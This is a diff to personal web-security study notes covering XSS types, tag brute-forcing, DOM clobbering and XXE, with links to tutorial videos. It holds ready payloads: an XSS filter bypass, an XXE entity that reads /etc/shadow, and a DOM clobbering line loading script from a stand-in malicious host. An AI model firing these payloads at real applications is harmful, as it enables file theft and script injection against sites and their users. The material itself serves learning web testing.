@@ -1,4 +1,4 @@
-
+# Xss
 ## types
 ### Stored (Persistent) 
 XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
@@ -10,6 +10,25 @@ Occurs when user input is displayed on the page after being processed by the bac
 ## DOM-based XSS 	Another Non-Persistent 
 XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)
 
+
+
+## xss bypass
+```js
+<<a|ascript>alert('xss')</script>
+```
+
+##  Deprecated Interface XXE injection
+Use a deprecated B2B interface that was not properly shut down. XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
+- search xxe payload
+- look for POST requests
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&xxe;</lastName>
+</userInfo>
+```
 
 ## Tags bruteforcing
 - [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
@@ -62,10 +81,15 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
 
-## Other Resources:
-#### xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
-- filtering and sanitazation come frontend back end.
-- Always test that frontend and backend are sanitized.
-- eg: registering an account by API with email.
+## Videos:
+- xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
+  - filtering and sanitazation come frontend back end.
+  - Always test that frontend and backend are sanitized.
+  - eg: registering an account by API with email.
+- [w3schools.com/xml](https://www.w3schools.com/xml/xml_dtd.asp)
+- [XXE Lab Breakdown: Exploiting XXE using external entities to retrieve files](https://www.youtube.com/watch?v=71dZaGfOVqw)
+- [How to search for XXE!](https://www.youtube.com/watch?v=0DQnWalxYb4)
+- [Web App Testing: Episode 3 - XSS, SQL Injection, and Broken Access Control](https://www.youtube.com/watch?v=azYwfI26oXo&list=PLLKT__MCUeixCoi2jtP2Jj8nZzM4MOzBL&index=3)
+
 
  
